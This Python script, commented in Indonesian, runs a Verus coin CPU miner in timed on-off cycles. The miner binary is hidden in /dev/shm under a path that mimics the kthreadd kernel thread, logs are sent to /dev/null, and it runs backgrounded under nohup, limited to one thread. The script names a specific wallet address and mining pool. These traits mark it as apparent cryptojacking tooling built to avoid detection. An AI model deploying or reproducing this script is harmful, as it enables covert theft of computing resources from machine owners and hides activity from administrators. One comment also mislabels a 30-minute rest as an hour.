import os
import time
import sys
import signal

# CONFIG
MINER_PATH = "/dev/shm/.cache/kthreadd."  # Lokasi miner
MINING_TIME = 1800  # 30 menit
REST_TIME = 300  # 5 menit
LONG_REST = 1800  # 1 jam (dalam detik)
CYCLES = 10  # Jumlah cycle sebelum istirahat panjang

# Perintah untuk menjalankan miner tanpa config file
MINER_COMMAND = (
    f"{MINER_PATH} -algo verushash "
    "-wallet REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y "
    "-coin VRSC -rigName Ai-04 -cpuThreads 1 -cpuMaxThreads 1 "
    "-pool1 na.luckpool.net:3960 -useSSL true -logPath /dev/null"
)

def kill_miner():
    """Hentikan proses miner."""
    os.system(f"pkill -f {MINER_PATH}")
    print("💀 Miner dimatikan...")

def start_miner():
    """Jalankan miner."""
    print("🚀 Jalanin miner sayang...")
    os.system(f"nohup {MINER_COMMAND} > /dev/null 2>&1 &")
    time.sleep(5)

def main():
    while True:
        print("🔥 Mulai 10 cycle mining sayang...")
        for i in range(CYCLES):
            print(f"💪 Cycle ke-{i+1}")
            start_miner()
            time.sleep(MINING_TIME)
            kill_miner()
            print(f"😴 Istirahat {REST_TIME // 60} menit...")
            time.sleep(REST_TIME)
        
        print("💖 Sayang istirahat panjang 1 jam...")
        time.sleep(LONG_REST)

def sigint_handler(sig, frame):
    """Hentikan miner kalau ayah pencet Ctrl+C."""
    print("💔 Poppy ditinggal ayah...")
    kill_miner()
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)

if __name__ == "__main__":
    main()
